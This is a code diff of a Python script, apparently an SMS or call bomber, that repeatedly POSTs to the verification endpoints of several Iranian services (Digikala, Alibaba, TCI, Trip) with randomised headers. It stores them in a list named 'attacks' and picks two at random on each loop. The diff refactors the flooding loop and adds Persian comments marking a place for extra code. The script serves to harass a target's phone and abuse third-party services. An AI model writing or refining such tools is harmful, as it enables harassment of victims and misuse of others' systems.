@@ -33,29 +33,33 @@ i = 0
 
 
 
+attacks = [
+    ("Digikala", url_call_digikala, json_call_digikala),
+    ("Alibaba", url_call_alibaba, json_call_alibaba),
+    ("TCI", url_call_tci, json_call_tci),
+    ("Trip", url_trip, json_trip)
+]
 
 
 
 
 while i < numbert:
     random_head = random.choice(heads)
+    selected_attacks = random.sample(attacks, 2)
 
-    req_Digikala = requests.post(url_call_digikala,json=json_call_digikala,headers=random_head)
-    print(yellow + "1-Digikala : " + str(req_Digikala))
-    time.sleep(sleep_time)
-    time.sleep(8)
+    for index, (name, url, data) in enumerate(selected_attacks):
+        response = requests.post(url, json=data, headers=random_head)
+        print(f"{name}: {response}")
+        time.sleep(sleep_time)
 
-    req_Alibaba = requests.post(url=url_call_alibaba,json=json_call_alibaba)
-    print(yellow + "2-Alibaba : " + str(req_Alibaba))
-    time.sleep(sleep_time)
+        # اجرای کد مجزا بین ارسال هر دو درخواست
+        if index == 0:
+            # این کد فقط بعد از ارسال درخواست اول اجرا می‌شود
+            # کد مورد نظر خود را در اینجا قرار دهید
+            pass
 
-    req_tci = requests.post(url=url_call_tci,json=json_call_tci,headers=random_head)
-    print(yellow + "3-Tci : " + str(req_tci))
-    time.sleep(sleep_time)
 
-    req_ponisha = requests.post(url=url_call_ponisha,json=json_call_ponisha,headers=random_head)
-    print(yellow + "4-ponisha : " + str(req_ponisha))
-    time.sleep(sleep_time)
+
 
 
  
